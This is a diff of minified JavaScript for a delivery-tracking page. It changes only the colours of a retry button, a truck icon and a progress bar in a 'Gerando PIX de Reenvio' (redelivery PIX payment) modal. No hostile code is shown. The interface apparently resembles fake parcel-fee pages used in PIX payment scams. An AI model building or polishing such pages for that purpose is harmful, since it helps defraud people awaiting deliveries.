@@ -15,7 +15,7 @@ class y{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.delive
                 </div>
             </div>
         `,n){const c=a.querySelector(".delivery-retry-btn");c&&this.configureDeliveryRetryButton(c)}return a}configureDeliveryRetryButton(e){e.style.cssText=`
-            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
             color: white;
             border: none;
             padding: 12px 25px;
@@ -24,7 +24,7 @@ class y{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.delive
             border-radius: 25px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
+            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
             animation: pulse 2s infinite;
             font-family: 'Roboto', sans-serif;
             letter-spacing: 0.5px;
@@ -57,7 +57,7 @@ class y{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.delive
             border: 3px solid #ff6b35;
         `,t.innerHTML=`
             <div style="margin-bottom: 20px;">
-                <i class="fas fa-truck" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
+                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
             </div>
             <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                 Gerando PIX de Reenvio...
@@ -67,7 +67,7 @@ class y{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.delive
             </p>
             <div style="margin-top: 25px;">
                 <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
-                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
+                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                 </div>
             </div>
             <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
